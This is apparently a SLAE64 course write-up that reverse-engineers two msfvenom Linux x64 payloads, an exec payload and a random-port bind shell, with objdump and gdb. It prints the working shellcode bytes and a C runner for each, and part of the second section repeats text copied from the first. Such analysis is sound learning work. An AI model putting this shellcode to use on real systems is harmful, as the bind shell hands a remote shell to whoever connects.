## Shellcode `linux/x64/exec` Dissection
---
---
### Introduction
---
The first `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/exec` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/exec --list-options
Options for payload/linux/x64/exec:
=========================

       Name: Linux Execute Command
     Module: payload/linux/x64/exec
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 40
       Rank: Normal

Provided by:
    ricky

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
CMD                    yes       The command string to execute

Description:
  Execute an arbitrary command
```
The payload is only 40 bytes and it requires a parameter in the `CMD` option, that's the command to execute. 

### Creating the Shellcode
---
Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
```c
SLAE64> msfvenom -p linux/x64/exec CMD="/bin/ls -l" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 50 bytes
Final size of c file: 236 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0b\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x6c\x00\x56\x57"
"\x48\x89\xe6\x0f\x05";
SLAE64> 

```
The generated payload size is 50 bytes, it increased it's size. This increase from 40 bytes is because the 10 bytes of `/bin/ls -l` string. Interesting.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_01.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0b\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x6c\x00\x56\x57"
"\x48\x89\xe6\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_01.c -o Payload_01
```
When it's run, it shows the files of the directory:

<img src="https://galminyana.github.io/img/A051_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the shellcode:

```asm
SLAE64> objdump -M intel -D Payload_01

**_REMOVED_**

0000000000004060 <code>:
    4060:	6a 3b                	push   0x3b
    4062:	58                   	pop    rax
    4063:	99                   	cdq    
    4064:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
    406b:	73 68 00 
    406e:	53                   	push   rbx
    406f:	48 89 e7             	mov    rdi,rsp
    4072:	68 2d 63 00 00       	push   0x632d
    4077:	48 89 e6             	mov    rsi,rsp
    407a:	52                   	push   rdx
    407b:	e8 0b 00 00 00       	call   408b <code+0x2b>
    4080:	2f                   	(bad)  
    4081:	62                   	(bad)  
    4082:	69 6e 2f 6c 73 20 2d 	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
    4089:	6c                   	ins    BYTE PTR es:[rdi],dx
    408a:	00 56 57             	add    BYTE PTR [rsi+0x57],dl
    408d:	48 89 e6             	mov    rsi,rsp
    4090:	0f 05                	syscall 
	...

**_REMOVED_**

SLAE64> 
```
Interesting that `objdump` detects some instructions as `(bad)`. Will have to check it.

### The Fun: GDB Analysis
---
After opening the file in `gdb` and set the `set disassembly-flavor intel`, a breakpoint is placed in `*&code` address. This is where the shellcode is placed and can start debugging just from there. Once the breakpoint is `set`, the `run` comand execs the code until reaching theit. Now if `disassemble` the code will show the payload code:
```asm
SLAE64> gdb ./Payload_01
GNU gdb (Debian 8.2.1-2+b3) 8.2.1

**_REMOVED_**

Reading symbols from ./Payload_01...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break *&code
Breakpoint 1 at 0x4060
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_01 
ShellCode Lenght: 13

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	push   0x3b
   0x0000555555558062 <+2>:	pop    rax
   0x0000555555558063 <+3>:	cdq    
   0x0000555555558064 <+4>:	movabs rbx,0x68732f6e69622f          <==
   0x000055555555806e <+14>:	push   rbx
   0x000055555555806f <+15>:	mov    rdi,rsp
   0x0000555555558072 <+18>:	push   0x632d                        <==
   0x0000555555558077 <+23>:	mov    rsi,rsp
   0x000055555555807a <+26>:	push   rdx
   0x000055555555807b <+27>:	call   0x55555555808b <code+43>     
   0x0000555555558080 <+32>:	(bad)  
   0x0000555555558081 <+33>:	(bad)  
   0x0000555555558082 <+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
   0x0000555555558089 <+41>:	ins    BYTE PTR es:[rdi],dx
   0x000055555555808a <+42>:	add    BYTE PTR [rsi+0x57],dl
   0x000055555555808d <+45>:	mov    rsi,rsp
   0x0000555555558090 <+48>:	syscall 
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
In the code, can see that some hex values are stored in registers and then in the stack. Let's convert all those hex values, to get any clue and idea of what the shellcode does. For that, Python is used to convert and reverse values:
```python
>>> "68732f6e69622f".decode('hex')[::-1]
'/bin/sh'
>>> "632d".decode('hex')[::-1]
'-c'
>>> 
```
Those values from lines +4 and +18 of the code, are the command that the payload has to execute and been defined in the `CMD` option. Still have to find where the choosen command is stored. Let's review the content of memory positions for the `(bad)` instructions. Those instructions are in positions `0x0000555555558080` and `0x0000555555558081`. Let's get the contents with `gdb`:
```asm
   0x000055555555807b <+27>:	call   0x55555555808b <code+43>
   0x0000555555558080 <+32>:	(bad)                                        <==
   0x0000555555558081 <+33>:	(bad)                                        <==
   0x0000555555558082 <+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c   
   0x0000555555558089 <+41>:	ins    BYTE PTR es:[rdi],dx
   0x000055555555808a <+42>:	add    BYTE PTR [rsi+0x57],dl
   0x000055555555808d <+45>:	mov    rsi,rsp
   0x0000555555558090 <+48>:	syscall 
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) x/xg 0x0000555555558080
0x555555558080 <code+32>:	0x20736c2f6e69622f
(gdb) x/2xg 0x0000555555558080
0x555555558080 <code+32>:	0x20736c2f6e69622f	0xe689485756006c2d
(gdb) 
```
Let's check what's this hex values `0x20736c2f6e69622f` and `0xe689485756006c2d` are:
```python
>>> "20736c2f6e69622f".decode('hex')[::-1]
'/bin/ls '
>>> "e689485756006c2d".decode('hex')[::-1]
'-l\x00VWH\x89\xe6'
>>> 
```
Here is the command `/bin/ls -l` stored in 10 bytes plus a NULL for the end of the string. Found it, it's stored in the `.text` section when the payload is created by `msfvenom`. The rest of the contents, `\x00VWH\x89\xe6` are the code instructions. With this, discovered why the mess in the code with the `(bad)` as it's for storing the command. 

> At this point we know that `/bin/sh -c` is stored in the stack, and the `/bin/ls -l` in the `.text` section in the 

Going further, a `syscall` instruction is made. Let's get which one is and what are it's parameters. Reviewing the code, the instructions at +0 and +2 assigns the `0x3b` value to RAX, the register to define the syscall number. This value is decimal 59, that stands for the `execve` syscall:
```asm
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	push   0x3b   <==  Syscall Number
   0x0000555555558062 <+2>:	pop    rax    <==
   0x0000555555558063 <+3>:	cdq    
**_REMOVED_**
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
From `execve` manpage:
```c
int  execve  (const  char  *filename,  const  char *argv [], const char *envp[]);
```
In assembly, params for this syscall are mapped to the following registers:
- RDI for `const  char  *filename`. This has to be the pointer to the `/bin/sh` command that's stored in the stack.
- RSI for `const  char *argv []`. The pointer to the address of the parameters for the command, in this case parameters are `/bin/sh` itself, `-c` and `/bin/ls -l".
- RDX for `const char *envp[]`. This value will be NULL (`0x0000000000000000`).

This is done in the following line codes:
```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x0000555555558063 <+3>:	cdq                 <== RDX <- 0x00
   0x0000555555558064 <+4>:	movabs rbx,0x68732f6e69622f
   0x000055555555806e <+14>:	push   rbx          <== Stores /bin/sh
   0x000055555555806f <+15>:	mov    rdi,rsp      <== RSP has the pointer to /bin/sh, puts it in RDI
   0x0000555555558072 <+18>:	push   0x632d
   0x0000555555558077 <+23>:	mov    rsi,rsp      <== Second parameter
**_REMOVED_**
End of assembler dump.
(gdb) 
```
At this point just something not so clear, the second parameter. Let's think about the `call` instruction on +27. How does `call` work:

1. Stores de Address of next instruction in the stack
2. Increments RSP
3. Jumps to the address

This means that once the instruction at +27 (`call 0x55555555808b <code+43>`) executes, the address of the parameters (`/bin/ls -l`) for the `execve` syscall are stored in the Stack and pointed by RSP. Hence why the instruction at +43 (`mov rsi,rsp`) is just before the `syscall`, to place the value of the adress containing the adress for the parameters:
```asm
(gdb) disassemble
**_REMOVED_**
0x000055555555807a <+26>:	push   rdx
0x000055555555807b <+27>:	call   0x55555555808b <code+43>     <== Pushes in stack the address of second parameter
0x0000555555558080 <+32>:	(bad)  
0x0000555555558081 <+33>:	(bad)  
0x0000555555558082 <+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
0x0000555555558089 <+41>:	ins    BYTE PTR es:[rdi],dx
0x000055555555808a <+42>:	add    BYTE PTR [rsi+0x57],dl
0x000055555555808d <+45>:	mov    rsi,rsp                      <== RSI <- Address of address containing the parameter string
0x0000555555558090 <+48>:	syscall 
**_REMOVED_^^
(gdb)
```
The call jumps to +43 (`0x55555555808b`), and there, the code does "something" to continue and finally end at +45 to execute the `mov rsi, rsp` to definitelly place the second parameter into RSI for the syscall. Here `gdb` probably is not properly disassembling, because the `call` goes to +43 while at +42 there is an `add`. 

One step more, run the code step by step and see what we can find out. Will do the following steps to get the info about register status during the execution and see if it's values are the right ones and match with the values of them just before `syscall`: 

1. Get the original value of **RSP** when the shellcode begins, and take well note of it: **`0x7fffffffe758`**
```asm
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	push   0x3b
**_REMOVED_** 
   0x0000555555558090 <+48>:	syscall 
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) info registers rsp
rsp            0x7fffffffe758      0x7fffffffe758
(gdb) 
```
2. `stepi`'ing instructions at +0 and +2, **RAX** gets the syscall number as it's value, **`0x3b`**. This value has to be the same just before the syscall. Also at +3 **RDX** gets value **0x00** by the `cdq`.
```asm
(gdb) stepi
0x0000555555558062 in code ()
(gdb) stepi
0x0000555555558063 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
   0x0000555555558060 <+0>:	push   0x3b
   0x0000555555558062 <+2>:	pop    rax
=> 0x0000555555558063 <+3>:	cdq    
**_REMOVED_**
End of assembler dump.
(gdb) info registers rax
rax            0x3b                59
(gdb) 
```
3. `stepi`'ing +4 and +14 pushes the `"/bin/sh",0x00` string in the stack. Here the original **RSP** would decrease 8 positions it's value to **`0x7fffffffe750`** (the 8 bytes pushed in the string). 
```asm
(gdb) stepi
0x000055555555806f in code ()
(gdb) disassemble 
**_REMOVED_**
   0x0000555555558064 <+4>:	movabs rbx,0x68732f6e69622f
   0x000055555555806e <+14>:	push   rbx                  <== "/bin/sh",0x00 o the stack
=> 0x000055555555806f <+15>:	mov    rdi,rsp              
**_REMOVED__*
End of assembler dump.
(gdb) info registers rsp
rsp            0x7fffffffe750      0x7fffffffe750
(gdb) x/1xg $rsp
0x7fffffffe750:	0x0068732f6e69622f
(gdb) x/s $rsp
0x7fffffffe750:	"/bin/sh"
(gdb) 
```` 
4. **RDI** register gets the address **`0x7fffffffe750`**, that is the memory position storing the `/bin/sh` command string first parameter of `execve`). The **RDI** value has to be **`0x7fffffffe750`**. _The value of RDI should not change anymore_. Everything looks fine by now:
```asm
(gdb) disassemble 
**_REMOVED_**
   0x000055555555806e <+14>:	push   rbx
   0x000055555555806f <+15>:	mov    rdi,rsp
=> 0x0000555555558072 <+18>:	push   0x632d
**_REMOVED_**
End of assembler dump.
(gdb) info registers rsp
rsp            0x7fffffffe750      0x7fffffffe750
(gdb) info registers rdi
rdi            0x7fffffffe750      140737488349008
(gdb) x/s $rsp
0x7fffffffe750:	"/bin/sh"
(gdb) 
```
5. Next, the `-c` string as the command parameter has to be also stacked. **RSP** updates to point now to **`0x7fffffffe748`**, and the top of the stack contains the string `"-c"`:
```asm
(gdb) stepi
0x0000555555558077 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x0000555555558072 <+18>:	push   0x632d
=> 0x0000555555558077 <+23>:	mov    rsi,rsp
**_REMOVED_**
End of assembler dump.
(gdb) info registers rsp 
rsp            0x7fffffffe748      0x7fffffffe748
(gdb) x/s $rsp
0x7fffffffe748:	"-c"
(gdb) 
```
6. Next instruction, saves the value of **RSP** into **RSI**. Now **RSI** has te value **`0x7fffffffe748`**, pointing to the address of the first parameter for the command:
```asm
(gdb) stepi
0x000055555555807a in code ()
(gdb) disassemble 
**_REMOVED_**
   0x0000555555558077 <+23>:	mov    rsi,rsp
=> 0x000055555555807a <+26>:	push   rdx
**_REMOVED_**
End of assembler dump.
(gdb) info registers rsp rsi
rsp            0x7fffffffe748      0x7fffffffe748
rsi            0x7fffffffe748      140737488349000
(gdb) x/s $rsi
0x7fffffffe748:	"-c"
(gdb) 
```
7. **RDX** that contains a NULL is also `push`'ed, updating **RSP** value to **`0x7fffffffe740`**
```asm
(gdb) stepi
0x000055555555807b in code ()
(gdb) disassemble 
**_REMOVED_**
   0x000055555555807a <+26>:	push   rdx
=> 0x000055555555807b <+27>:	call   0x55555555808b <code+43>
**_REMOVED_**
End of assembler dump.
(gdb) info registers rsp
rsp            0x7fffffffe740      0x7fffffffe740
(gdb) x/xg $rsp
0x7fffffffe740:	0x0000000000000000
(gdb) 
```
8. Now go to the `call` instruction. After executes, **`0x0000555555558080`** should be stacked and **RSP** updated -8 positions, to **`0x7fffffffe738`**:
```asm
(gdb) stepi                                         <= stepi
0x000055555555808b in code ()                       <== Something strange done by gdb :-/
                                                     == But it's the address pointed by CALL
(gdb) info registers rsp 
rsp            0x7fffffffe738      0x7fffffffe738   <== RSP Updated
(gdb) x/x $rsp
0x7fffffffe738:	0x0000555555558080                  <== CALL saves the next instruction address in the stack. 
                                                     == For us is the address pointing to /bin/ls -l
(gdb) 
```
  This address **`0x0000555555558080`** stacked, is the string defined as the program to execute for the payload, that in the `execve` call would be the 3th parameter. Let's check if this address really points to the `"/bin/ls -l"` string:
  ```asm
  (gdb) x/s 0x0000555555558080
  0x555555558080 <code+32>:	"/bin/ls -l"
  (gdb)
  ```
9. Now we define a `hook-stop` to follow up the values of **RSP** and **RSI** as this last one is the register that still does not have the right value before the syscall. Now have to `stepi` blindly as `gdb` does not show the instruction when disassembles:

```asm
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers rsi rsp
>x/xg $rsp
>end
(gdb) stepi                                           <== Another stepi
rsi            0x7fffffffe748      140737488349000    <== Still points to '-c'
rsp            0x7fffffffe730      0x7fffffffe730     <== 64 bits been pushed in the stack updating RSP
0x7fffffffe730:	0x00007fffffffe748
0x000055555555808c in code ()
(gdb) x/s $rsi
0x7fffffffe748:	"-c"                                  <== $RDI contais '-c'
(gdb) stepi                                           <== Another stepi
rsi            0x7fffffffe748      140737488349000
rsp            0x7fffffffe728      0x7fffffffe728     <== 64 bits more been pushed in the stack updating RSP
0x7fffffffe728:	0x00007fffffffe750
0x000055555555808d in code ()
(gdb) 
```
  At this point `gdb` recovered and next instruction to execute will be +45 `mov rsi, rsp`. 
  ```asm
  (gdb) disassemble 
  Dump of assembler code for function code:
     0x0000555555558060 <+0>:	push   0x3b
     0x0000555555558062 <+2>:	pop    rax
     0x0000555555558063 <+3>:	cdq    
     0x0000555555558064 <+4>:	movabs rbx,0x68732f6e69622f
     0x000055555555806e <+14>:	push   rbx
     0x000055555555806f <+15>:	mov    rdi,rsp
     0x0000555555558072 <+18>:	push   0x632d
     0x0000555555558077 <+23>:	mov    rsi,rsp
     0x000055555555807a <+26>:	push   rdx
     0x000055555555807b <+27>:	call   0x55555555808b <code+43>
     0x0000555555558080 <+32>:	(bad)  
     0x0000555555558081 <+33>:	(bad)  
     0x0000555555558082 <+34>:	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
     0x0000555555558089 <+41>:	ins    BYTE PTR es:[rdi],dx
     0x000055555555808a <+42>:	add    BYTE PTR [rsi+0x57],dl
  => 0x000055555555808d <+45>:	mov    rsi,rsp
     0x0000555555558090 <+48>:	syscall 
     0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
  End of assembler dump.
  (gdb) 
  ```
##### Let's do a break in the debugging...
...to check every register and stack contents, for everything looks as it should. 
As had to blindly `stepi` by two instructions, need to ensure that values for the registers are the ones that should be for the analysis being done until now. All are correct:

- **RAX** : `0x3b`

```asm
(gdb) info registers rax 
rax            0x3b                59
(gdb) 
```

- **RDI** : `0x7fffffffe750`  ==> Address of /bin/sh

```asm
(gdb) info registers rax 
rax            0x3b                59
(gdb) info registers rdi
rdi            0x7fffffffe750      140737488349008
(gdb) x/s $rdi
0x7fffffffe750:	"/bin/sh"
(gdb) 
```

- **RSI** : `0x7fffffffe748`  ==> Address of '-c' in the stack

```asm
(gdb) info registers rsi
rsi            0x7fffffffe748      140737488349000
(gdb) x/s $rsi
0x7fffffffe748:	"-c"
(gdb) 
```

- **RDX** : 0x00

```asm
(gdb) info registers rdx
rdx            0x0                 0
(gdb) 
```
##### End break
All looks good, the part where had to `stepi` blindly, didnt change the original values of the registers. But also, in that blind code, some values been pushed in the stack in the right order required by the stack technique for `execve` syscall:
- **`0x00007fffffffe750`**  that's the memory address for `/bin/sh` :
```asm
(gdb) x/x $rsp
0x7fffffffe728:	0x00007fffffffe750
(gdb) x/s 0x00007fffffffe750
0x7fffffffe750:	"/bin/sh"
(gdb) 
```
- **`0x00007fffffffe748`** that's the memory address for  `-c` :
```asm
(gdb) x/xg 0x7fffffffe730
0x7fffffffe730:	0x00007fffffffe748
(gdb) x/s 0x00007fffffffe748
0x7fffffffe748:	"-c"
(gdb) 
```
By the operations done in the blind code and the actual values of the registers, what has to be done is:
```asm
push rsi    <== the @ for "-c"
push rdi    <== the @ for //bin/sh"
```

9. Let's `stepi`, this is where definitelly **RSI** get's the pointer to the second parameter for the `execve` syscall.
```asm
(gdb) stepi
0x0000555555558090 in code ()
(gdb) disassemble 
**_REMOVED__**
   0x000055555555808d <+45>:	mov    rsi,rsp
=> 0x0000555555558090 <+48>:	syscall 
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) info registers rsi rsp
rsi            0x7fffffffe728      140737488348968        <== Same value as RSP
rsp            0x7fffffffe728      0x7fffffffe728
(gdb) 
```
Let's review the status of the stack:
```markdown
  Stack Address      Value pointing a sting    String pointed 
|------------------|------------------------|------------------|
|  0x7fffffffe728  |   0x00007fffffffe750   | "/bin/sh"        |
|  0x7fffffffe730  |   0x00007fffffffe748   | "-c"             |
|  0x7fffffffe738  |   0x0000555555558080   | "/bin/ls -l"     |
|  0x7fffffffe740  |   0x0000000000000000   | n/a              |
|------------------------------------------ -------------------|
```

At this point, the **`const  char *argv []`** is referenced by **RSI** that got the value of **RSP** (`0x7fffffffe728`). From there, the rest of the required params are also in order in the stack. With everything looking in order, can go into the syscall, that will finally execute the `/bin/ls` comand:

```asm
(gdb) disassemble 
Dump of assembler code for function code:
**_REMOVED_**
   0x000055555555808d <+45>:	mov    rsi,rsp
=> 0x0000555555558090 <+48>:	syscall 
   0x0000555555558092 <+50>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) stepi
process 1123 is executing new program: /usr/bin/dash

[1]+  Stopped                gdb ./Payload_01
SLAE64> 
```
Everything worked as expected!

### Thoughts
---
The following handicaps been found:

- `gdb` not showing properly those blind instructions. Making it a bit more complicated to debug having to guess which instructions should been executed. This been resolved per the results on the stack and guessing which values should be stacked.
- the `call` technique used, combined with the parameters for the payload stored in the code in the `.text` section had to be understood. Per how this is done, some shellcodes should have been added because the strings that `gdb` probably interprets wrongly

The payload uses a mix of Stack and a new Technique using the `call` that results in a very interesting shellcode to review.

#### `CALL` Trick Analysis. What about the _gdb_ issue
If we check again the `objdump` output for the program:
```asm
SLAE64> objdump -M intel -D Payload_01
**_REMOVED_**
0000000000004060 <code>:
    4060:	6a 3b                	push   0x3b
    4062:	58                   	pop    rax
    4063:	99                   	cdq    
    4064:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
    406b:	73 68 00 
    406e:	53                   	push   rbx
    406f:	48 89 e7             	mov    rdi,rsp
    4072:	68 2d 63 00 00       	push   0x632d
    4077:	48 89 e6             	mov    rsi,rsp
    407a:	52                   	push   rdx
    407b:	e8 0b 00 00 00       	call   408b <code+0x2b>
    4080:	2f                   	(bad)  
    4081:	62                   	(bad)  
    4082:	69 6e 2f 6c 73 20 2d 	imul   ebp,DWORD PTR [rsi+0x2f],0x2d20736c
    4089:	6c                   	ins    BYTE PTR es:[rdi],dx
    408a:	00 56 57             	add    BYTE PTR [rsi+0x57],dl
    408d:	48 89 e6             	mov    rsi,rsp
    4090:	0f 05                	syscall 
	...
**_REMOVED_**
SLAE64> 
```
The `call` does replace **RIP** value to jump to the instruction at `0x408b`. Reviewing this opcodes:

- Opcode 0x56: Stands for `push rsi`
- Opcode 0x57: Stands for `push rdi`

Notice that if we take the shellcode from the `0x4080` to `0x408a` adresses and convert it to a string, the `"/bin/ls -l",0x00` is stored on there:
```python
>>> "2f62696e2f6c73202d6c00".decode('hex')
'/bin/ls -l\x00'
>>> 
```
Results in the string we defined as the comand to execute in the payload. Now everything makes sense :-)

This shows that `msfvenom` when constructs the payload, has to take care to make the `call` function to jump to the first instruction after the length of the command string.

This **`call`** technique used to store the `CMD` parameter during the payload generation, is interesting:
- It allows to have any string stored in the `.text` section
- Does not matter the size of the string. Does not need to be a multiple of 8, and add extra chars to it (avoids the use of strings like `/bin**//**ls` adding a extra "/" to make it multiple of 8).



### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_01.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_01.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/exec` shellcode.
- [Shellcode_01.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_01.txt) : The rax shellcode in hex into a text file.


## Shellcode `linux/x64/shell_bind_tcp_random_port` Dissection
---
---
### Introduction
---
The first `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_bind_tcp_random_port` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_bind_tcp_random_port --list-options
Options for payload/linux/x64/shell_bind_tcp_random_port:
=========================


       Name: Linux Command Shell, Bind TCP Random Port Inline
     Module: payload/linux/x64/shell_bind_tcp_random_port
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 57
       Rank: Normal

Provided by:
    Geyslan G. Bem <geyslan@gmail.com>

Description:
  Listen for a connection in a random port and spawn a command shell. 
  Use nmap to discover the open port: 'nmap -sS target -p-'.
```

The payload is only 78 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `RHOST`: The target address

> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger.

### Creating the Shellcode
---
Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
```c
SLAE64> msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 57 bytes
Final size of c file: 264 bytes
unsigned char buf[] = 
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_02.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_02.c -o Payload_02
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A052_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_02
**_REMOVED_**
0000000000004060 <code>:
    4060:	48 31 f6             	xor    rsi,rsi
    4063:	48 f7 e6             	mul    rsi
    4066:	ff c6                	inc    esi
    4068:	6a 02                	push   0x2
    406a:	5f                   	pop    rdi
    406b:	b0 29                	mov    al,0x29
    406d:	0f 05                	syscall 
    406f:	52                   	push   rdx
    4070:	5e                   	pop    rsi
    4071:	50                   	push   rax
    4072:	5f                   	pop    rdi
    4073:	b0 32                	mov    al,0x32
    4075:	0f 05                	syscall 
    4077:	b0 2b                	mov    al,0x2b
    4079:	0f 05                	syscall 
    407b:	57                   	push   rdi
    407c:	5e                   	pop    rsi
    407d:	48 97                	xchg   rdi,rax
    407f:	ff ce                	dec    esi
    4081:	b0 21                	mov    al,0x21
    4083:	0f 05                	syscall 
    4085:	75 f8                	jne    407f <code+0x1f>
    4087:	52                   	push   rdx
    4088:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
    408f:	2f 73 68 
    4092:	57                   	push   rdi
    4093:	54                   	push   rsp
    4094:	5f                   	pop    rdi
    4095:	b0 3b                	mov    al,0x3b
    4097:	0f 05                	syscall 
	...
**_REMOVED_**
SLAE64> 
```
Per the disassembled code, a total of 5 syscalls been used. Let's see which ones are for the values of RAX before `syscall` instruction:
- `sys_socket` : Value 0x29
- `sys_listen` : Value 0x32
- `sys_accept` : Value 0x2b
- `sys_dup2`   : Value 0x21
- `sys_execve` : Value 0x3b

### The Fun: GDB Analysis
---
As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.

Let's load the exec file into `gdb`, setup the environment, and place a breakpoint in the code section with `b *&code`:

```asm
SLAE64> gdb ./Payload_02
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Reading symbols from ./Payload_02...(no debugging symbols found)...done.
(gdb) 
(gdb) set disassembly-flavor intel
(gdb) b *&code
Breakpoint 1 at 0x4060
(gdb) 
```
Now can start debugging, let's `run` the program and `disassemble` it:
```asm
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_02 
ShellCode Lenght: 57

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	xor    rsi,rsi
   0x0000555555558063 <+3>:	mul    rsi
   0x0000555555558066 <+6>:	inc    esi
   0x0000555555558068 <+8>:	push   0x2
   0x000055555555806a <+10>:	pop    rdi
   0x000055555555806b <+11>:	mov    al,0x29
   0x000055555555806d <+13>:	syscall 
   0x000055555555806f <+15>:	push   rdx
   0x0000555555558070 <+16>:	pop    rsi
   0x0000555555558071 <+17>:	push   rax
   0x0000555555558072 <+18>:	pop    rdi
   0x0000555555558073 <+19>:	mov    al,0x32
   0x0000555555558075 <+21>:	syscall 
   0x0000555555558077 <+23>:	mov    al,0x2b
   0x0000555555558079 <+25>:	syscall 
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
   0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
   0x0000555555558087 <+39>:	push   rdx
   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
   0x0000555555558092 <+50>:	push   rdi
   0x0000555555558093 <+51>:	push   rsp
   0x0000555555558094 <+52>:	pop    rdi
   0x0000555555558095 <+53>:	mov    al,0x3b
   0x0000555555558097 <+55>:	syscall 
   0x0000555555558099 <+57>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
